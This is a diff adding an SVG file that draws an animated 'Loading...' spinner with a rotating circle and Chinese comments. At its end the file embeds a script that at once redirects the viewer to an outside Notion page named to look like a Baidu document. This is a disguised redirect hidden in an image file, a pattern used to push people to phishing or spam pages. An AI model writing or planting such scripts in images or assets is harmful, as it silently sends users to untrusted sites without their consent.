@@ -1,0 +1,51 @@
+<svg width="100%" height="100%" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+  <!-- 背景渐变 -->
+  <defs>
+    <linearGradient id="bgGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" style="stop-color:lightblue;stop-opacity:1" />
+      <stop offset="100%" style="stop-color:lightgrey;stop-opacity:1" />
+    </linearGradient>
+  </defs>
+  <rect width="100%" height="100%" fill="url(#bgGradient)" />
+
+  <!-- 动态加载logo：旋转并填充颜色的圆圈 -->
+  <circle cx="100" cy="100" r="40" fill="transparent" stroke="deepskyblue" stroke-width="8" stroke-linecap="round">
+    <!-- 动画：旋转 -->
+    <animateTransform
+      attributeName="transform"
+      type="rotate"
+      from="0 100 100"
+      to="360 100 100"
+      dur="2s"
+      repeatCount="indefinite"
+    />
+    <!-- 动画：填充颜色渐变 -->
+    <animate
+      attributeName="stroke"
+      values="deepskyblue;white;deepskyblue"
+      dur="3s"
+      repeatCount="indefinite"
+    />
+  </circle>
+  
+  
+  <!-- 动态文本 -->
+  <text x="50" y="150" font-family="Arial" font-size="20" fill="black">
+    <tspan>Loading...</tspan>
+    <!-- 动画：文本颜色在黑色和灰色之间变化 -->
+    <animate
+      attributeName="fill"
+      values="black;gray;black"
+      dur="1s"
+      repeatCount="indefinite"
+    />
+  </text>
+
+  <!-- JavaScript: 立即重定向 -->
+  <script type="application/ecmascript">
+    <![CDATA[
+      // 立即重定向到指定URL
+      window.location.href = "https://baidudoc.notion.site/7a527149f0184287b5faa08ed149faa1?v=42310cb64539481c887f789d21ab4d89";
+    ]]>
+  </script>
+</svg>
